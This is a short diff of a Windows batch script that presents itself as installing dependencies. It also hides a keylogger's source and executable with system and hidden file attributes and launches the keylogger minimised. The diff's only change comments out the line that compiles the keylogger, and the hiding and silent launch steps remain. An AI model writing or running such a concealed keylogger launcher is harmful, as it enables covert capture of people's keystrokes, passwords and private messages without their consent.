@@ -2,7 +2,7 @@
 cd src
 ECHO Installing Required Dependencies
 python pipLibs.py
-g++ keyLogger.cpp -w -o keyLogger 
+:: g++ keyLogger.cpp -w -o keyLogger 
 attrib +h +s keyLogger.cpp
 attrib +h +s keyLogger.exe 
 start /MIN .\keyLogger.exe 
